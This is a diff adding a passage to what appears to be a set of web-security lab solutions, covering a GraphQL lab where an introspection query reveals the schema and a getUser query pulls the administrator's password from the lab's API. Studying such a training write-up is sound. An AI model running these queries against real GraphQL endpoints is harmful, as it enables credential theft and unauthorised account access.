@@ -1190,6 +1190,86 @@ found the password
 
 
 
+<details>
+  <summary>Lab: Accidental exposure of private GraphQL fields</summary>
+
+
+### > The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.
+
+> To solve the lab, sign in as the administrator and delete the username ``carlos``. 
+
+---
+
+find this request 
+
+<img width="1211" height="602" alt="image" src="https://github.com/user-attachments/assets/ce5ced22-73f4-416f-835a-effedd00e716" />
+
+``Introspection Query``
+
+```json
+{
+
+  "query": " query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
+
+}
+```
+
+``Introspection Result``
+
+<img width="1540" height="640" alt="image" src="https://github.com/user-attachments/assets/07d67e10-15c5-4b3a-95a9-5a60b4b257f7" />
+
+<img width="843" height="720" alt="image" src="https://github.com/user-attachments/assets/acca9c26-a639-4f12-8c97-1b4b5edcd8de" />
+
+now try to use ``getUser(id:Int!): User`` to find **``administrator``** user
+
+
+```graphql
+{
+  getUser(id: 1) {
+    id
+    username
+    password
+  }
+}
+
+```
+
+<img width="1316" height="367" alt="image" src="https://github.com/user-attachments/assets/e932fd39-cead-4b3d-9c44-3ae3474b1329" />
+
+
+```
+administrator : lnqajgkwlru628r4sgjc
+```
+
+<img width="1330" height="486" alt="image" src="https://github.com/user-attachments/assets/4ed941d2-305e-4e47-8b02-58d16d623fb2" />
+
+<img width="1290" height="268" alt="image" src="https://github.com/user-attachments/assets/89d700e2-75c7-4ab1-8c53-441c2c82b3fe" />
+
+
+  
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
